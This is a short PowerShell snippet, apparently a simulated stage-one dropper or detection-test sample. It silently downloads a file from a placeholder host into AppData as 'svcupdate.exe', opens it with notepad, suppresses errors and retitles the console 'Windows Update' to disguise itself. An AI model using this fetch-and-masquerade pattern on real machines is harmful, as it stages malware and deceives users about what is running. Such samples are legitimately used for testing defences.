
<# Remote fetch #> $Stage1Url = 'https://contoso.com/update.dat'; $PayloadPath = "$env:APPDATA\svcupdate.exe"; curl.exe -s -L -o $PayloadPath $Stage1Url; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; Set-Location -Path $env:TEMP
